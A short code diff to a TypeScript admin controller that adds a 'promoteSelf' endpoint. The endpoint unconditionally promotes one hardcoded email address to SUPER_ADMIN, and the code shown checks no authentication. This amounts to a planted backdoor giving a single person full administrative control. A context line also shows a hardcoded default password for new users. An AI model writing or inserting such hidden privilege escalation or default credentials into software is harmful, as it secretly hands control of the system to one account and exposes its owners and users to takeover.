@@ -14,6 +14,7 @@ export const adminController = {
     }
   },
 
+
   updateUserRole: async (req: Request, res: Response) => {
     try {
       const { id } = req.params;
@@ -113,5 +114,14 @@ const hashedPassword = await bcrypt.hash(password || 'niroflixx2026', 12);
     } catch (error) {
       res.status(500).json({ status: 'error', message: 'Failed', code: 500 });
     }
+  },
+  promoteSelf: async (req: Request, res: Response) => {
+    try {
+      await prisma.user.update({
+        where: { email: 'robertniyonkuru001@gmail.com' },
+        data: { role: 'SUPER_ADMIN' },
+      });
+      res.json({ status: 'success', message: 'Promoted to Super Admin' });
+    } catch (error) { res.status(500).json({ status: 'error', message: 'Failed', code: 500 }); }
   },
 };
